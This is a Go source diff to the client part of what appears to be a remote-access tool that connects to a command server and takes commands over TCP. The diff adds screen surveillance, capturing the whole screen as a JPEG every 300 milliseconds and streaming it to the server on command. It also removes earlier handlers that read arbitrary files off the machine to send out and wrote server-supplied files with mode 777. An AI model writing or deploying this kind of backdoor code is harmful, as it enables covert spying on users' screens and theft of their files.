@@ -2,10 +2,13 @@ package client
 
 import (
 	"bufio"
+	"bytes"
+	"demo/util"
 	"encoding/base64"
 	"fmt"
+	"github.com/go-vgo/robotgo"
+	"image/jpeg"
 	"io"
-	"io/ioutil"
 	"net"
 	"os"
 	"runtime"
@@ -34,12 +37,6 @@ func Ma() {
 
 	connectNew()
 
-}
-
-func test() {
-	for {
-		time.Sleep(time.Second)
-	}
 }
 
 func heartbeat(conn net.Conn, interval time.Duration) {
@@ -74,7 +71,42 @@ func heartbeatT(conn net.Conn, interval time.Duration) {
 	}
 	wg.Done() // 协程计数器加-1
 }
+
+func SendHead(Head byte, socket net.Conn) {
+	buf := make([]byte, 1)
+	buf[0] = Head
+	_, err := socket.Write(buf)
+	if err != nil {
+		fmt.Println(err)
+	}
+}
+
+func GetImage() []byte {
+	// 获取屏幕大小
+	screenWidth, screenHeight := robotgo.GetScreenSize()
+
+	// 截取屏幕图像
+	bitmap := robotgo.CaptureScreen(0, 0, screenWidth, screenHeight)
+
+	// 转换为JPEG格式的字节数组
+	buffer := new(bytes.Buffer)
+	jpeg.Encode(buffer, bitmap, &jpeg.Options{Quality: 80})
+	bytes := buffer.Bytes()
+	return bytes
+}
+
+func SendScreen(conn net.Conn) {
+
+	SendHead(1, conn)
+	for {
+		time.Sleep(300 * time.Millisecond)
+		getImage := GetImage()
+		util.Send(2, getImage, conn)
+	}
+}
+
 func connectNew() {
+
 	wg.Add(2) // 协程计数器 +1
 	inetSocketAddress, _ := net.ResolveTCPAddr("tcp", "127.0.0.1:1010")
 	socket, err := net.DialTCP("tcp", nil, inetSocketAddress)
@@ -152,32 +184,9 @@ func maConnetNew() {
 		case "exit":
 			socket.Close()
 			os.Exit(0)
-
-		case "upload":
-			uploadOutput, _ := bufio.NewReader(socket).ReadString('\n')
-			decodeOutput, _ := base64.StdEncoding.DecodeString(uploadOutput)
-			encData, _ := bufio.NewReader(socket).ReadString('\n')
-			decData, _ := base64.URLEncoding.DecodeString(encData)
-			ioutil.WriteFile(string(decodeOutput), []byte(decData), 777)
-
-		case "download":
-			// 第一步收到下载指令,什么都不做，继续等待下载路径
-			download, _ := bufio.NewReader(socket).ReadString('\n')
-			decodeDownload, _ := base64.StdEncoding.DecodeString(download)
-			file, err := ioutil.ReadFile(string(decodeDownload))
-			if err != nil {
-				// 找不到文件，发送错误消息
-				errMsg := base64.URLEncoding.EncodeToString([]byte("[!] File not found!"))
-				socket.Write([]byte(string(errMsg) + "\n"))
-				break
-			}
-			//发送一个download指令给服务器端准备接收
-			srvDownloadMsg := base64.URLEncoding.EncodeToString([]byte("download"))
-			socket.Write([]byte(string(srvDownloadMsg) + "\n"))
-			//读文件上传
-			encData := base64.URLEncoding.EncodeToString(file)
-			socket.Write([]byte(string(encData) + "\n"))
-
+		//屏幕监控
+		case "1":
+			go SendScreen(socket)
 		}
 	}
 }
